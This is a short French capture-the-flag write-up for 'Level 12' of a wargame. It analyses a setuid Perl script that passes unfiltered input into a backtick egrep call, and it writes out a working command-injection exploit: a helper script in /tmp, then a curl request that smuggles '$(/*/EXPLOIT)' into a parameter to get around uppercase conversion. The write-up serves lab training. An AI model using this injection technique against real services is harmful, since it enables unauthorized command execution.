## Level 12

### Analyse
On trouve un script Perl exécuté via un binaire setuid qui agit comme un mini service.  
Le script utilise une commande système de ce type :

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
Le paramètre $xx provient directement de l’entrée utilisateur et n’est pas filtré.
Le backtick en Perl exécute une commande système → vulnérabilité de command injection.

### Exploitation
On contourne la contrainte des majuscules en passant par un script externe.

```bash
$ echo 'getflag > /tmp/flag12' > /tmp/EXPLOIT
$ chmod +x /tmp/EXPLOIT

$ curl 'localhost:4646?x=$(/*/EXPLOIT)'
$ cat /tmp/flag12
```
